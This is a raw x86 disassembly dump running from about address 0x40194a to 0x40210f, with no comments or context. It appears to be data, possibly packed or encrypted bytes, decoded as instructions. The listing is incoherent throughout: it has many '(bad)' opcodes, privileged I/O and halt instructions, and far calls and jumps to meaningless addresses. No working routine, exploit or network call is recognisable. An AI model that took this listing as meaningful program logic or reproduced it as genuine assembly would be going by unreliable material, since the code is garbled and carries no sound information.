  40194a:	ret    0x972d
  40194d:	pop    edi
  40194e:	sub    eax,DWORD PTR [esi+0x32]
  401951:	push   cs
  401952:	inc    esi
  401953:	lea    ecx,[esi]
  401955:	adc    ecx,DWORD PTR [ebx-0x710a9c8d]
  40195b:	out    0x77,al
  40195d:	cmp    ebx,ecx
  40195f:	dec    ecx
  401960:	aas    
  401961:	mov    esp,0xd339d4a6
  401966:	inc    edi
  401967:	dec    ax
  401969:	push   ds
  40196a:	xor    bh,dl
  40196c:	repz pop esp
  40196e:	(bad)  
  40196f:	jb     0x401995
  401971:	fisttp DWORD PTR es:[edx]
  401974:	cs aaa 
  401976:	inc    esi
  401977:	cdq    
  401978:	jle    0x40192f
  40197a:	pop    eax
  40197b:	xchg   esi,ebx
  40197d:	adc    esp,DWORD PTR [ecx]
  40197f:	xchg   BYTE PTR [esi+0x46],ah
  401982:	sbb    dl,ah
  401984:	pop    ds
  401985:	add    al,cl
  401987:	adc    cl,BYTE PTR [ebx+0x75c44f63]
  40198d:	xbegin 0x4b5923d9
  401993:	lea    eax,[esi-0x68660434]
  401999:	sub    DWORD PTR [edx],0x6d678b3a
  40199f:	mov    al,0x64
  4019a1:	or     al,0xe7
  4019a3:	dec    ebx
  4019a4:	inc    edx
  4019a5:	and    BYTE PTR [eax+0x57],cl
  4019a8:	dec    eax
  4019a9:	imul   eax,DWORD PTR [ecx+0x2e26e15c],0xde17af81
  4019b3:	repz cli 
  4019b5:	in     eax,0xef
  4019b7:	mov    ds:0xd3c7a420,eax
  4019bc:	jecxz  0x401a21
  4019be:	and    bl,BYTE PTR fs:[ecx+0x53]
  4019c2:	adc    esi,DWORD PTR [edx]
  4019c4:	inc    esp
  4019c5:	jns    0x4019c1
  4019c7:	retf   0x77c9
  4019ca:	cli    
  4019cb:	lods   al,BYTE PTR ds:[esi]
  4019cc:	jae    0x401a05
  4019ce:	stos   DWORD PTR es:[edi],eax
  4019cf:	inc    edi
  4019d0:	shl    DWORD PTR [esi],1
  4019d2:	jl     0x401a46
  4019d4:	xchg   ebp,eax
  4019d5:	inc    esi
  4019d6:	cmp    DWORD PTR [ebx],ebx
  4019d8:	(bad)  
  4019d9:	enter  0xc818,0xb4
  4019dd:	dec    esi
  4019de:	dec    esi
  4019df:	popa   
  4019e0:	mov    bh,BYTE PTR ds:0x8d77b6dc
  4019e6:	or     al,0x63
  4019e8:	mov    dh,0x90
  4019ea:	imul   esi,DWORD PTR [eax],0xffffffad
  4019ed:	pop    ebx
  4019ee:	ffreep st(3)
  4019f0:	mov    ah,0x4e
  4019f2:	sbb    DWORD PTR [edi],0x69
  4019f5:	inc    edx
  4019f6:	xor    edx,DWORD PTR [ecx]
  4019f8:	iret   
  4019f9:	mov    al,ds:0x8a91a310
  4019fe:	push   edi
  4019ff:	aad    0x3f
  401a01:	ret    
  401a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a03:	cs xchg esi,eax
  401a05:	iret   
  401a06:	adc    al,0xe4
  401a08:	jge    0x401a63
  401a0a:	xor    ah,BYTE PTR [ebp+0x37]
  401a0d:	adc    BYTE PTR [edx+0x2e],dh
  401a10:	mov    ebx,0x5f50957c
  401a15:	das    
  401a16:	adc    eax,0xd54efc60
  401a1b:	into   
  401a1c:	dec    ebp
  401a1d:	cdq    
  401a1e:	shr    ch,1
  401a20:	jnp    0x4019a8
  401a22:	jo     0x401a20
  401a24:	xchg   edx,eax
  401a25:	pop    esp
  401a26:	inc    edi
  401a27:	inc    esi
  401a28:	test   eax,0xda62f4fa
  401a2d:	in     eax,0x42
  401a2f:	jnp    0x4019ee
  401a31:	adc    DWORD PTR [esi+0x61cf70d2],ebp
  401a37:	cwde   
  401a38:	push   cs
  401a39:	cmp    edi,ebp
  401a3b:	jns    0x4019fd
  401a3d:	or     al,0x79
  401a3f:	mov    ds:0x8f7c1e03,eax
  401a44:	aad    0xdf
  401a46:	rcr    DWORD PTR [edi+0x70],0x44
  401a4a:	push   ecx
  401a4b:	lea    edx,[eax+ebx*4+0x6b815f69]
  401a52:	(bad)  
  401a53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a54:	ins    DWORD PTR es:[edi],dx
  401a55:	(bad)  
  401a56:	fst    DWORD PTR [eax-0x7f3446a]
  401a5c:	mov    al,0x1f
  401a5e:	cmp    ebp,DWORD PTR [edi]
  401a60:	vpcmpgtw ymm1,ymm4,YMMWORD PTR [edx-0x5318ef53]
  401a68:	pop    sp
  401a6a:	dec    eax
  401a6b:	xor    BYTE PTR [ebp-0x7b3b569c],dl
  401a71:	outs   dx,DWORD PTR ds:[esi]
  401a72:	or     eax,0x8b9195e5
  401a77:	and    DWORD PTR [eax],0x31
  401a7a:	push   ds
  401a7b:	outs   dx,DWORD PTR ds:[esi]
  401a7c:	popf   
  401a7d:	iret   
  401a7e:	in     al,0x55
  401a80:	dec    edi
  401a81:	lock jbe 0x401a41
  401a84:	shl    DWORD PTR [ebx+0x16],1
  401a87:	push   0x4f
  401a89:	data16 adc BYTE PTR fs:[ebx+edi*4-0x1b5c50cd],0x4d
  401a93:	fnstenv [ebx-0x2fe60308]
  401a99:	(bad)  
  401a9a:	mov    ds:0x62c58930,al
  401a9f:	ficomp DWORD PTR [ebp+0x63]
  401aa2:	sbb    BYTE PTR [eax*4-0x7ff21e90],0x12
  401aaa:	xor    ah,BYTE PTR [ebx]
  401aac:	push   0xd8737d90
  401ab1:	xchg   ebp,eax
  401ab2:	cmc    
  401ab3:	ret    
  401ab4:	or     DWORD PTR [eax],edx
  401ab6:	popa   
  401ab7:	xor    eax,0x1ecc4b85
  401abc:	adc    eax,0xeb5e3090
  401ac1:	out    0xac,al
  401ac3:	pop    ss
  401ac4:	dec    edi
  401ac5:	jecxz  0x401b0a
  401ac7:	add    DWORD PTR [ecx],esi
  401ac9:	mov    ecx,ebp
  401acb:	mov    al,ds:0xaf34e2c
  401ad0:	ret    
  401ad1:	in     al,dx
  401ad2:	mov    ecx,0xfc70778b
  401ad7:	out    dx,eax
  401ad8:	mov    al,ds:0x2bfcfcfd
  401add:	(bad)  
  401ade:	(bad)  
  401adf:	aad    0x80
  401ae1:	ins    BYTE PTR es:[edi],dx
  401ae2:	mov    DWORD PTR [ebx+0x1a],ebx
  401ae5:	sub    eax,0x98915acd
  401aea:	ins    DWORD PTR es:[edi],dx
  401aeb:	mov    WORD PTR [edx],es
  401aed:	adc    al,0xc8
  401aef:	ror    BYTE PTR [eax-0x2b],cl
  401af2:	jno    0x401b39
  401af4:	clc    
  401af5:	mov    eax,0x6269408c
  401afa:	mov    ecx,0x1cab64b7
  401aff:	jne    0x401aa0
  401b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b02:	inc    ebx
  401b03:	scas   al,BYTE PTR es:[edi]
  401b04:	fwait
  401b05:	and    dl,bh
  401b07:	adc    eax,0xf56eaa63
  401b0c:	imul   esi,edx,0x3b37731a
  401b12:	mov    al,ds:0x78629135
  401b17:	call   0x5428:0xe18cf53b
  401b1e:	fbld   TBYTE PTR [ecx]
  401b20:	dec    eax
  401b21:	cmp    eax,0x964289dd
  401b26:	jmp    0x401b77
  401b28:	sub    DWORD PTR [ecx-0x3d445e09],eax
  401b2e:	test   DWORD PTR [edx+0x47fa895a],edx
  401b34:	dec    esp
  401b35:	repz call 0x5dde:0x7d8fc0e7
  401b3d:	mov    bh,0x3d
  401b3f:	aad    0xb1
  401b41:	ret    
  401b42:	dec    esi
  401b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b44:	mov    al,ds:0x80553fe
  401b49:	addr16 xchg ebx,eax
  401b4b:	pop    esi
  401b4c:	test   al,0xea
  401b4e:	arpl   WORD PTR [edi],si
  401b50:	jl     0x401b8f
  401b52:	stos   DWORD PTR es:[edi],eax
  401b53:	inc    edx
  401b54:	fdivr  DWORD PTR [eax-0x3766f187]
  401b5a:	ds push ss
  401b5c:	ja     0x401b79
  401b5e:	sbb    BYTE PTR [ebp+0x79],bh
  401b61:	dec    ebp
  401b62:	ret    0x3daa
  401b65:	ffree  st(2)
  401b67:	push   es
  401b68:	jecxz  0x401b2b
  401b6a:	bound  eax,QWORD PTR [ebx]
  401b6c:	cmp    BYTE PTR [ecx],0x82
  401b6f:	nop
  401b70:	mov    ds:0xf0905632,al
  401b75:	sub    ch,BYTE PTR [esi-0x75]
  401b78:	call   0xa979:0xbb994079
  401b7f:	jb     0x401b6d
  401b81:	mov    ax,ds:0xaa9db09e
  401b87:	fidivr DWORD PTR [edi]
  401b89:	cmc    
  401b8a:	cs jo  0x401b65
  401b8d:	loope  0x401b66
  401b8f:	and    al,0xcf
  401b91:	inc    esp
  401b92:	push   ebp
  401b93:	les    esp,FWORD PTR [ebx]
  401b95:	stos   DWORD PTR es:[edi],eax
  401b96:	xchg   esp,eax
  401b97:	mov    ds:0xceb2b08,eax
  401b9c:	fiadd  WORD PTR [edx-0x69]
  401b9f:	nop
  401ba0:	push   edx
  401ba1:	test   ah,dl
  401ba3:	jo     0x401be2
  401ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ba6:	shl    DWORD PTR [ebx-0x1ed1d895],cl
  401bac:	(bad)  
  401bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bae:	icebp  
  401baf:	loop   0x401baa
  401bb1:	xor    eax,0xcbda8829
  401bb6:	dec    esp
  401bb7:	fcom   QWORD PTR [esi]
  401bb9:	and    esp,DWORD PTR [edi+0x7c2c8c4b]
  401bbf:	das    
  401bc0:	das    
  401bc1:	add    BYTE PTR [edi-0x2a],dl
  401bc4:	mov    al,ds:0x57f1819e
  401bc9:	lods   al,BYTE PTR ds:[esi]
  401bca:	ss adc esp,0x95891a6a
  401bd1:	pop    ss
  401bd2:	sbb    DWORD PTR [ebx],esi
  401bd4:	sbb    bl,BYTE PTR [esi+0x69dcc920]
  401bda:	retf   0x2231
  401bdd:	inc    eax
  401bde:	xor    edx,0x6c
  401be1:	(bad)
  401be4:	jmp    0x401bcb
  401be6:	sub    BYTE PTR [eax+0x4b],dl
  401be9:	retf   
  401bea:	jbe    0x401beb
  401bec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bed:	fldcw  WORD PTR [esi-0x63fc9786]
  401bf3:	xchg   edx,eax
  401bf4:	jno    0x401c3e
  401bf6:	mov    dl,0x14
  401bf8:	jp     0x401c75
  401bfa:	sar    DWORD PTR [edx-0x29],1
  401bfd:	test   BYTE PTR [ebx-0x6afda63a],bl
  401c03:	mov    cs,WORD PTR [ebx]
  401c05:	push   0x7b71a7db
  401c0a:	xchg   ebp,eax
  401c0b:	mov    ah,0x47
  401c0d:	popf   
  401c0e:	aam    0x60
  401c10:	lahf   
  401c11:	xchg   edi,eax
  401c12:	jecxz  0x401c50
  401c14:	push   ds
  401c15:	bound  esi,QWORD PTR [eax]
  401c17:	call   0xdf6999a7
  401c1c:	xchg   esi,eax
  401c1d:	arpl   WORD PTR [edx+0xd],sp
  401c20:	fild   WORD PTR [ecx+0x17160fa]
  401c26:	cld    
  401c27:	pop    edx
  401c28:	jmp    0xa7c45b30
  401c2d:	pop    ss
  401c2e:	jno    0x401c40
  401c30:	xor    ebx,esi
  401c32:	arpl   bx,di
  401c34:	dec    ebx
  401c35:	test   al,0xe8
  401c37:	retf   0x2f5a
  401c3a:	stos   DWORD PTR es:[edi],eax
  401c3b:	leave  
  401c3c:	ror    DWORD PTR [eax-0x2a1aa358],cl
  401c42:	loop   0x401cb5
  401c44:	ss stos BYTE PTR es:[edi],al
  401c46:	or     eax,0xc97d10de
  401c4b:	pop    edi
  401c4c:	nop
  401c4d:	cmp    al,0x9a
  401c4f:	jb     0x401bdc
  401c51:	dec    eax
  401c52:	or     dh,BYTE PTR [ebx+0x2af74a5e]
  401c58:	push   edi
  401c59:	jp     0x401c51
  401c5b:	sahf   
  401c5c:	jmp    0x569de233
  401c61:	icebp  
  401c62:	imul   esi,DWORD PTR [ebp+eax*8-0x4],0xb123d09a
  401c6a:	fcom   DWORD PTR [esi-0x45]
  401c6d:	cld    
  401c6e:	(bad)  
  401c6f:	(bad)  
  401c70:	cmp    ecx,eax
  401c72:	nop
  401c73:	jns    0x401c72
  401c75:	stos   DWORD PTR es:[edi],eax
  401c76:	add    BYTE PTR ds:0x953edd01,cl
  401c7c:	and    DWORD PTR [ebx-0x7e],esi
  401c7f:	xchg   ecx,eax
  401c80:	mov    ss,esi
  401c82:	push   ebx
  401c83:	call   0x72d50cee
  401c88:	or     BYTE PTR [ebp+ecx*1+0x7435d8f8],dh
  401c8f:	add    BYTE PTR [ebx],dh
  401c91:	push   0xbd20dd86
  401c96:	(bad)  
  401c97:	fnsave [esi+0x4e153c4a]
  401c9d:	mov    ds:0x673203ae,eax
  401ca2:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  401ca4:	ss lock jecxz 0x401cda
  401ca8:	mov    eax,0x39245a33
  401cad:	loop   0x401c5b
  401caf:	psrld  mm6,mm0
  401cb2:	mov    al,0x42
  401cb4:	mov    eax,DWORD PTR [eax]
  401cb6:	inc    ecx
  401cb7:	aam    0x3
  401cb9:	sbb    ebx,DWORD PTR [ecx-0x53]
  401cbc:	mov    ah,0xcb
  401cbe:	mov    dl,0xdd
  401cc0:	shr    DWORD PTR [esp+eax*8+0x3d],0x16
  401cc5:	sbb    cl,BYTE PTR [ebx+ebp*8+0x39]
  401cc9:	adc    eax,0xd88228ac
  401cce:	jbe    0x401d0e
  401cd0:	jbe    0x401d1d
  401cd2:	shl    al,1
  401cd4:	inc    esi
  401cd5:	dec    edi
  401cd6:	jl     0x401cac
  401cd8:	sub    al,0x3e
  401cda:	les    esp,FWORD PTR [edi]
  401cdc:	sub    BYTE PTR [eax+ebx*1],dh
  401cdf:	and    BYTE PTR [edi-0x75],ch
  401ce2:	jns    0x401cbf
  401ce4:	mov    bl,0x7f
  401ce6:	cmp    DWORD PTR [ecx-0x78],esp
  401ce9:	imul   esi,DWORD PTR [ebp+ebx*4+0x37351c7d],0xa76cdab2
  401cf4:	pop    ss
  401cf5:	ja     0x401d4b
  401cf7:	fstp   QWORD PTR [edx+0x196240fd]
  401cfd:	mov    al,0xfd
  401cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d00:	and    eax,0xafb531ba
  401d05:	(bad)  [ebp-0x548e6dfa]
  401d0b:	leave  
  401d0c:	imul   edx,DWORD PTR [eax],0xe2470136
  401d12:	cmc    
  401d13:	fmul   QWORD PTR ds:0xc974039
  401d19:	test   BYTE PTR [esi],ch
  401d1b:	or     al,0xb4
  401d1d:	jecxz  0x401d2a
  401d1f:	or     eax,0xb2041e80
  401d24:	pop    edx
  401d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d26:	xchg   edi,eax
  401d27:	in     al,0xd
  401d29:	sub    BYTE PTR [ecx+edi*8+0x79],0x38
  401d2e:	lds    edx,FWORD PTR [ecx-0x10]
  401d31:	popa   
  401d32:	adc    dh,BYTE PTR [ebp+0x50]
  401d35:	mov    esi,0x54522cb2
  401d3a:	(bad)  
  401d3b:	cmp    DWORD PTR [ecx-0x70],ecx
  401d3e:	xchg   edx,eax
  401d3f:	and    al,0x23
  401d41:	add    DWORD PTR [edi-0x51],edx
  401d44:	sub    al,0xf1
  401d46:	call   0x1e1b67b6
  401d4b:	sbb    DWORD PTR [ecx],edi
  401d4d:	add    bl,al
  401d4f:	ins    BYTE PTR es:[edi],dx
  401d50:	mov    eax,DWORD PTR [esi-0x71]
  401d53:	std    
  401d54:	div    BYTE PTR [edi-0x7]
  401d57:	xchg   DWORD PTR [esi-0x60],eax
  401d5a:	scas   al,BYTE PTR es:[edi]
  401d5b:	and    bh,BYTE PTR [esi+0x70]
  401d5e:	mov    ebp,0x667270e7
  401d63:	aam    0xce
  401d65:	cwde   
  401d66:	hlt    
  401d67:	push   ebp
  401d68:	out    0x2d,al
  401d6a:	(bad)  
  401d6b:	jmp    0x3927a221
  401d70:	mov    al,0x87
  401d72:	sub    eax,0x2a173187
  401d77:	xchg   DWORD PTR [esi+edi*4],edx
  401d7a:	jmp    0x401d8f
  401d7c:	cdq    
  401d7d:	pop    ebp
  401d7e:	xchg   ebx,eax
  401d7f:	lods   eax,DWORD PTR ds:[esi]
  401d80:	adc    bh,ah
  401d82:	mov    edx,0x77be8915
  401d87:	ret    0x9234
  401d8a:	loopne 0x401d8e
  401d8c:	xor    dl,ch
  401d8e:	add    DWORD PTR [eax+0x55],ebx
  401d91:	mov    ecx,0x661d08ee
  401d96:	jne    0x401d87
  401d98:	out    0xd5,eax
  401d9a:	popa   
  401d9b:	or     al,0x21
  401d9d:	in     al,dx
  401d9e:	and    al,0x6
  401da0:	jne    0x401dd2
  401da2:	dec    edi
  401da3:	xor    ebx,DWORD PTR [ebp-0x1d]
  401da6:	fsubr  st(7),st
  401da8:	std    
  401da9:	cmp    dh,cl
  401dab:	aaa    
  401dac:	jbe    0x401d32
  401dae:	loopne 0x401d52
  401db0:	push   0xffffffa3
  401db2:	inc    ecx
  401db3:	clc    
  401db4:	xchg   BYTE PTR [edx],ah
  401db6:	sbb    eax,0xeb16ee2c
  401dbb:	mov    edi,0x791ab341
  401dc0:	ds loope 0x401e34
  401dc3:	push   ss
  401dc4:	loope  0x401d83
  401dc6:	xchg   ebx,eax
  401dc7:	dec    esi
  401dc8:	rcr    DWORD PTR [eax-0x1f4a6104],cl
  401dce:	out    dx,al
  401dcf:	ror    DWORD PTR ds:0x41bfe296,0xaa
  401dd6:	add    esp,DWORD PTR [ebx]
  401dd8:	stos   DWORD PTR es:[edi],eax
  401dd9:	clc    
  401dda:	cmp    DWORD PTR [esi-0x71],0x46
  401dde:	lods   eax,DWORD PTR ds:[esi]
  401ddf:	into   
  401de0:	xchg   ebp,eax
  401de1:	test   DWORD PTR [ecx-0x105a7178],0x683c15b9
  401deb:	adc    eax,0x90c6ff42
  401df0:	je     0x401dff
  401df2:	popa   
  401df3:	xor    eax,0x214567eb
  401df8:	fist   DWORD PTR [ecx+0x625bebd]
  401dfe:	pop    ebp
  401dff:	fisub  WORD PTR [ebx+0x6c]
  401e02:	mov    edi,0xcd1660b6
  401e07:	sbb    eax,0x7fdc9740
  401e0c:	adc    dl,BYTE PTR [ecx-0x2e71516e]
  401e12:	sub    eax,0x8bf92aeb
  401e17:	jg     0x401dc0
  401e19:	fisubr DWORD PTR [ebx]
  401e1b:	or     DWORD PTR [edi],0xa84163d6
  401e21:	pop    ebp
  401e22:	pusha  
  401e23:	jl     0x401e76
  401e25:	ror    ecx,0x29
  401e28:	retf   
  401e29:	(bad)  
  401e2a:	in     eax,dx
  401e2b:	jbe    0x401e78
  401e2d:	sbb    BYTE PTR ds:0x88e5d007,al
  401e33:	jbe    0x401e21
  401e35:	mov    ebx,0x93fca654
  401e3a:	or     al,0x67
  401e3c:	add    dl,BYTE PTR [edx]
  401e3e:	mov    ecx,DWORD PTR [edi-0xc]
  401e41:	rcl    DWORD PTR [ebx+0x62],1
  401e44:	(bad)  
  401e45:	mov    DWORD PTR [ecx],edx
  401e47:	ins    BYTE PTR es:[edi],dx
  401e48:	adc    DWORD PTR [ebx-0x56],edx
  401e4b:	mov    edi,DWORD PTR [edx+esi*8]
  401e4e:	inc    ecx
  401e4f:	pop    ebp
  401e50:	dec    esi
  401e51:	sub    bh,BYTE PTR [edi+esi*1-0x41292121]
  401e58:	adc    BYTE PTR [edx+eax*2+0x4584eedc],bl
  401e5f:	repnz loop 0x401ec0
  401e62:	jae    0x401de7
  401e64:	mov    ah,0xba
  401e66:	cmp    ah,BYTE PTR [ecx+ebp*4+0x1e161dfb]
  401e6d:	cmp    eax,0x63f3a657
  401e72:	and    dh,BYTE PTR [ecx]
  401e74:	inc    edx
  401e75:	(bad)  
  401e76:	jmp    0x47f28928
  401e7b:	aaa    
  401e7c:	dec    esi
  401e7d:	push   ebp
  401e7e:	imul   ebp,DWORD PTR [ecx-0xc],0xd8e23735
  401e85:	or     eax,0xbd0336ad
  401e8a:	mov    eax,0x14878033
  401e8f:	xchg   BYTE PTR [ebx+0x642e549a],dh
  401e95:	inc    edi
  401e96:	add    dh,BYTE PTR [eax+0x33]
  401e99:	fcmovnbe st,st(6)
  401e9b:	gs leave 
  401e9d:	imul   edx,DWORD PTR [esi+0x2eac9fe1],0xffffffea
  401ea4:	int    0x47
  401ea6:	retf   0x8848
  401ea9:	or     eax,0xea3fbba
  401eae:	cmp    eax,0x7fb19eac
  401eb3:	retf   0x6ebb
  401eb6:	(bad)  
  401eb7:	rol    ecx,1
  401eb9:	mov    DWORD PTR [eax-0x15dde6c7],eax
  401ebf:	daa    
  401ec0:	rcr    BYTE PTR [eax+0x42],cl
  401ec3:	xor    al,0xcb
  401ec5:	ins    BYTE PTR es:[edi],dx
  401ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ec7:	dec    esi
  401ec8:	(bad)  
  401ec9:	aad    0xaf
  401ecb:	outs   dx,DWORD PTR ds:[esi]
  401ecc:	fld    DWORD PTR [ecx-0x9]
  401ecf:	jecxz  0x401f33
  401ed1:	cmp    eax,0xd8fee92f
  401ed6:	imul   eax,DWORD PTR [ebp+eiz*1+0x45],0xffffffcc
  401edb:	js     0x401e62
  401edd:	mov    ebx,0x81994d25
  401ee2:	dec    ebx
  401ee3:	(bad)  
  401ee4:	cmp    dl,al
  401ee6:	gs push ebp
  401ee8:	push   ss
  401ee9:	push   0xffffffb7
  401eeb:	fcomp  st(4)
  401eed:	call   DWORD PTR [ebx-0x5e98af0f]
  401ef3:	pop    esp
  401ef4:	push   cs
  401ef5:	sbb    ecx,DWORD PTR [ebp-0x1a]
  401ef8:	jge    0x401edf
  401efa:	or     bh,cl
  401efc:	sbb    dl,BYTE PTR [eax-0x58]
  401eff:	test   DWORD PTR [edx-0x38858bb6],esi
  401f05:	inc    ebx
  401f06:	jbe    0x401f58
  401f08:	(bad)  
  401f0a:	mov    bh,0x14
  401f0c:	pop    esi
  401f0d:	mov    esp,gs
  401f0f:	cdq    
  401f10:	sbb    al,0xa0
  401f12:	pop    edi
  401f13:	ins    DWORD PTR es:[edi],dx
  401f14:	xor    esp,DWORD PTR [ebp+0x4867b759]
  401f1a:	test   DWORD PTR [edx],ebp
  401f1c:	jg     0x401ea4
  401f1e:	dec    edx
  401f1f:	js     0x401f3d
  401f21:	or     esi,DWORD PTR [ecx-0x5c735a17]
  401f27:	cmp    ebp,ecx
  401f29:	sbb    eax,0xf939781e
  401f2e:	sub    al,0x70
  401f30:	les    ecx,FWORD PTR [edi]
  401f32:	and    ecx,DWORD PTR [esi]
  401f34:	or     ah,BYTE PTR es:[esi-0x6f3c01f5]
  401f3b:	adc    BYTE PTR [ebx+edi*8-0x1f3c7716],dl
  401f42:	pop    edx
  401f43:	aaa    
  401f44:	mov    al,0xb7
  401f46:	sahf   
  401f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f48:	xor    BYTE PTR ds:0x4606a156,cl
  401f4e:	xchg   BYTE PTR [edx-0x50a1b7cc],ch
  401f54:	jg     0x401f24
  401f56:	sbb    eax,0xe6bd116c
  401f5b:	xor    ch,BYTE PTR [edx-0x420e41c7]
  401f61:	cmc    
  401f62:	mov    bh,0xcc
  401f64:	inc    ebp
  401f65:	mov    eax,0xd9d6e51
  401f6a:	test   BYTE PTR [ebx+0x30],dl
  401f6d:	push   ecx
  401f6e:	jle    0x401f04
  401f70:	xchg   esp,eax
  401f71:	cmp    ebx,DWORD PTR [edi-0x33d6ef57]
  401f77:	add    cl,0xb0
  401f7a:	add    bl,BYTE PTR [ecx]
  401f7c:	in     al,dx
  401f7d:	es nop
  401f7f:	adc    eax,0x9edcf5f
  401f84:	sub    eax,0xeffdc952
  401f89:	mov    eax,0x50993ce
  401f8e:	sbb    DWORD PTR [ebp+0x7edea67b],ebx
  401f94:	and    edx,esi
  401f96:	or     al,0x8
  401f98:	jno    0x401f92
  401f9a:	cmc    
  401f9b:	gs xchg ebx,eax
  401f9d:	add    esp,DWORD PTR [esi]
  401f9f:	jb     0x401f76
  401fa1:	mov    esi,DWORD PTR [ecx+0x8867492]
  401fa7:	div    BYTE PTR [ebp+0x62843b9e]
  401fad:	les    ecx,FWORD PTR [eax+ebx*8-0x28]
  401fb1:	leave  
  401fb2:	xchg   esi,eax
  401fb3:	pop    edx
  401fb4:	out    dx,eax
  401fb5:	(bad)  
  401fb6:	xor    al,0x9d
  401fb8:	(bad)  
  401fba:	sar    BYTE PTR [edi+edx*2],0xd2
  401fbe:	std    
  401fbf:	nop
  401fc0:	mov    dh,cl
  401fc2:	pop    eax
  401fc3:	pop    ebx
  401fc4:	dec    eax
  401fc5:	popf   
  401fc6:	scas   eax,DWORD PTR es:[edi]
  401fc7:	mov    BYTE PTR [ecx-0x26663086],al
  401fcd:	call   0xd92b:0x6b79486d
  401fd4:	add    DWORD PTR [ebx-0x32b12bfb],ecx
  401fda:	loope  0x40201e
  401fdc:	push   esp
  401fdd:	xchg   ebp,eax
  401fde:	pop    ss
  401fdf:	mov    al,ds:0x11e7172d
  401fe4:	(bad)  
  401fe5:	sub    al,0x44
  401fe7:	test   al,al
  401fe9:	arpl   WORD PTR [eax+0x1f],sp
  401fec:	xor    al,0x7d
  401fee:	jae    0x401f8d
  401ff0:	std    
  401ff1:	(bad)  
  401ff3:	test   BYTE PTR [edx],0x2b
  401ff6:	jno    0x402021
  401ff8:	aad    0x1b
  401ffa:	jbe    0x402040
  401ffc:	adc    BYTE PTR [edx+0x7bf4431f],al
  402002:	les    esi,FWORD PTR ds:0x3c023dd3
  402008:	push   ebx
  402009:	jl     0x401fa6
  40200b:	(bad)  
  40200c:	stc    
  40200d:	fimul  WORD PTR [ecx-0x7e]
  402010:	push   es
  402011:	pop    ebx
  402012:	pop    ebx
  402013:	sbb    edx,DWORD PTR [ecx]
  402015:	call   0xf14996cc
  40201a:	mov    al,ds:0x282d59f3
  40201f:	sub    al,0xfc
  402021:	imul   BYTE PTR [edx+0x66]
  402024:	hlt    
  402025:	ret    0x3b6c
  402028:	push   ebx
  402029:	retf   
  40202a:	jnp    0x4020a5
  40202c:	test   DWORD PTR gs:[ebx+0x14],0xd8fc7941
  402034:	add    al,0x41
  402036:	fidiv  DWORD PTR [esi-0x547217bf]
  40203c:	fbstp  TBYTE PTR [eax]
  40203e:	or     dl,dl
  402040:	addr16 inc ebx
  402042:	and    BYTE PTR [edx-0x520ce0ff],dl
  402048:	repnz jmp FWORD PTR [ebx]
  40204b:	xchg   ebx,eax
  40204c:	nop
  40204d:	inc    ecx
  40204e:	sahf   
  40204f:	lods   eax,DWORD PTR ds:[esi]
  402050:	jge    0x402033
  402052:	sbb    BYTE PTR [eax],ah
  402054:	js     0x402091
  402056:	jge    0x40208c
  402058:	adc    BYTE PTR [ebp+edi*4-0x33073491],ch
  40205f:	xlat   BYTE PTR ds:[ebx]
  402060:	mov    ecx,esi
  402062:	js     0x402057
  402064:	sbb    DWORD PTR [ebx+esi*1-0x36],eax
  402068:	stos   BYTE PTR es:[edi],al
  402069:	push   esp
  40206a:	out    dx,eax
  40206b:	mov    dl,0x9e
  40206d:	jnp    0x402066
  40206f:	add    BYTE PTR [ecx-0x244a034d],0x8
  402076:	xchg   ebp,eax
  402077:	ins    DWORD PTR es:[edi],dx
  402078:	push   cs
  402079:	adc    ah,al
  40207b:	push   cs
  40207c:	pushf  
  40207d:	leave  
  40207e:	or     al,0x18
  402080:	push   0xf0a37882
  402085:	hlt    
  402086:	sub    BYTE PTR [edx+0x30fa57ca],bl
  40208c:	jg     0x4020b4
  40208e:	inc    esi
  40208f:	ficom  DWORD PTR [eax]
  402091:	and    al,BYTE PTR [edx+eax*4+0x28]
  402095:	pop    ebx
  402096:	mov    dh,0xe5
  402098:	scas   eax,DWORD PTR es:[edi]
  402099:	mov    esi,0xeda93af9
  40209e:	in     eax,0x58
  4020a0:	gs repnz push edi
  4020a3:	push   esi
  4020a4:	push   0xffffff88
  4020a6:	mov    bx,0x2720
  4020aa:	mov    ds,WORD PTR [esi-0x781bfabd]
  4020b0:	lods   al,BYTE PTR ds:[esi]
  4020b1:	push   esp
  4020b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020b3:	call   0xcbda:0x36a1
  4020b9:	fidivr WORD PTR [ebp-0x33]
  4020bc:	test   bh,0xc2
  4020bf:	push   ebp
  4020c0:	jecxz  0x4020c9
  4020c2:	mov    eax,ds:0x3a38462e
  4020c7:	add    al,0x5b
  4020c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020ca:	stc    
  4020cb:	push   0x73
  4020cd:	mov    ah,0x11
  4020cf:	imul   edx,DWORD PTR [edx-0x62eeb9a3],0xffffffd1
  4020d6:	pop    es
  4020d7:	jp     0x40206a
  4020d9:	fsub   QWORD PTR [edx+0x58]
  4020dc:	out    dx,al
  4020dd:	rcl    DWORD PTR [ebx+0x18],cl
  4020e0:	push   edi
  4020e1:	data16 (bad) 
  4020e3:	push   eax
  4020e4:	cs jle 0x4020be
  4020e7:	jge    0x4020d1
  4020e9:	mov    edx,0x7d41517b
  4020ee:	mov    edx,0xdcf3bc
  4020f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f4:	mov    ebx,0x26e7eb10
  4020f9:	or     al,0x27
  4020fb:	or     cl,BYTE PTR [esi]
  4020fd:	push   esi
  4020fe:	sbb    ecx,ebx
  402100:	sahf   
  402101:	(bad)  
  402102:	mov    ch,0x2
  402104:	pushf  
  402105:	loop   0x402172
  402107:	cli    
  402108:	sbb    ch,BYTE PTR [ebx]
  40210a:	mov    esi,0xb5e8f450
  40210f:	pop    esp
